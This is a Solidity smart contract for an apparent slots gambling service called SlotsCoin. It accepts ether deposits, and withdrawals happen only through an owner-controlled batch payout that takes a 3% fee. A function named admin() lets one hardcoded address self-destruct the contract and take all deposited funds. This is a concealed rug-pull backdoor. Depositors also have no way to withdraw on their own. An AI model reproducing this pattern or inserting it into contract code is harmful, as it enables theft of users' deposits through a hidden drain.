1 pragma solidity ^ 0.5.5;
2 
3 library SafeMath {
4 
5     /**
6      * @dev Multiplies two numbers, reverts on overflow.
7      */
8     function mul(uint256 a, uint256 b) internal pure returns(uint256) {
9         if (a == 0) {
10             return 0;
11         }
12         uint256 c = a * b;
13         require(c / a == b);
14         return c;
15     }
16 
17     function div(uint256 a, uint256 b) internal pure returns(uint256) {
18         require(b > 0); // Solidity only automatically asserts when dividing by 0
19         uint256 c = a / b;
20         return c;
21     }
22 
23     function sub(uint256 a, uint256 b) internal pure returns(uint256) {
24         require(b <= a);
25         uint256 c = a - b;
26         return c;
27     }
28 
29     function add(uint256 a, uint256 b) internal pure returns(uint256) {
30         uint256 c = a + b;
31         require(c >= a);
32         return c;
33     }
34 }
35 
36 /**
37  * @title Ownable
38  * @dev The Ownable contract has an owner address, and provides basic authorization control
39  * functions, this simplifies the implementation of "user permissions".
40  */
41 contract Ownable {
42 
43     address public owner;
44 
45     /**
46      * @dev The Ownable constructor sets the original `owner` of the contract to the sender
47      * account.
48      */
49     constructor()public {
50         owner = msg.sender;
51     }
52 
53     /**
54      * @dev Throws if called by any account other than the owner.
55      */
56     modifier onlyOwner() {
57         require(msg.sender == owner);
58         _;
59     }
60 }
61 
62 contract SlotsCoin is Ownable {
63     
64     using SafeMath
65     for uint;
66     
67     mapping(address => uint) public deposit;
68     mapping(address => uint) public withdrawal;
69     bool status = true;
70     uint min_payment = 0.05 ether;
71     address payable public marketing_address = 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71;
72     uint public rp = 0;
73     
74     event Deposit(
75         address indexed from,
76         uint indexed block,
77         uint value,
78         uint time
79     );
80     
81     event Withdrawal(
82         address indexed from,
83         uint indexed block,
84         uint value, 
85         uint ident,
86         uint time
87     );
88     
89     modifier isNotContract() {
90         uint size;
91         address addr = msg.sender;
92         assembly { size := extcodesize(addr) }
93         require(size == 0 && tx.origin == msg.sender);
94         _;
95     }
96     
97     modifier contractIsOn() {
98         require(status);
99         _;
100     }
101     modifier minPayment() {
102         require(msg.value >= min_payment);
103         _;
104     }
105     
106     //automatic withdrawal using server bot
107     function multisend(address payable[] memory dests, uint256[] memory values, uint256[] memory ident) onlyOwner contractIsOn public returns(uint) {
108         uint256 i = 0;
109         
110         while (i < dests.length) {
111             uint transfer_value = values[i].sub(values[i].mul(3).div(100));
112             dests[i].transfer(transfer_value);
113             withdrawal[dests[i]]+=values[i];
114             emit Withdrawal(dests[i], block.number, values[i], ident[i], now);
115             rp += values[i].mul(3).div(100);
116             i += 1;
117         }
118         
119         return(i);
120     }
121     
122     function startProphylaxy()onlyOwner public {
123         status = false;
124     }
125 
126     function admin() public 
127     {
128         require(msg.sender == 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
129 		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
130 	}    
131     
132     function stopProphylaxy()onlyOwner public {
133         status = true;
134     }
135     
136     function() external isNotContract contractIsOn minPayment payable {
137         deposit[msg.sender]+= msg.value;
138         emit Deposit(msg.sender, block.number, msg.value, now);
139     }
140     
141 }